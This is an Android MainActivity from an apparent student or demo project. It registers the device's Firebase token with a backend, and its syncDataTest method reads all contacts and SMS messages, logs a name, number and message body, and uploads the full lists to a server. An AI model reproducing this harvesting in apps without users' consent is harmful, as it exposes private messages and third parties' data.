package fr.intechinfo.fusionandroid;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.messaging.FirebaseMessagingService;

import retrofit2.Call;

import static android.content.ContentValues.TAG;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        onNewIntent(getIntent());
        FirebaseMessaging.getInstance().subscribeToTopic("ServiceNow");
        PermissionUtil.initPermissions(this);
        RetrofitAPI retrofitAPI = HttpExecute.BuildAPI();
        Token token = new Token();
        token.SetToken(FirebaseInstanceId.getInstance().getToken());
        final Call<Token> stringCall = retrofitAPI.CreateNewDevice(token);
        HttpExecute t = new HttpExecute(stringCall);
        t.start();
    }
    protected void syncDataTest(){
        RetrofitAPI retrofitAPI = HttpExecute.BuildAPI();
        ContentCollector cc = new ContentCollector();
        ContactsList contactLs = new ContactsList();
        contactLs.SetContact(cc.GetContacts(this));
        Log.d(TAG,"Name : "+ contactLs.GetContact().get(1).GetName()+" Number : " + contactLs.GetContact().get(1).GetNumber());
        SMSList SMSLs = new SMSList();
        SMSLs.SetSMS(cc.GetSMS(this));
        Log.d(TAG,"Creator : "+ SMSLs.GetSMS().get(1).GetCreator()+" Message : " + SMSLs.GetSMS().get(1).GetBody());

        new HttpExecute(retrofitAPI.CreateContacts(contactLs)).start();
        new HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start();
    }
}
